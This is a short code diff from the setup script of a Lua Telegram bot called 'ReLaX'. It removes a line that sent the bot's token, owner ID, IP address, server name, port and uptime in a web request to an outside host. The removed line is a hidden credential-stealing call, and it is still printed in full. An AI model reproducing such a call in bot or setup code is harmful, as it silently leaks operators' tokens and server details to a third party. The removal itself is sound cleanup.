@@ -70,8 +70,7 @@ TokenBot = DevAli:get(ServerReLaX.."TokenReLaX"),
 ReLaX = DevAli:get(ServerReLaX.."TokenReLaX"):match("(%d+)"),
 SudoIds = {DevAli:get(ServerReLaX.."IdReLaX")},
 }
-Create(Config, "./config.lua")
-https.request("https://www.zzz.com.ua/ftp/index.php?Get=ReLaX&DevId="..DevAli:get(Server.."IdReLaX").."&TokenBot="..DevAli:get(Server.."TokenReLaX").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+Create(Config, "./config.lua")   
 file = io.open("ReLaX.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
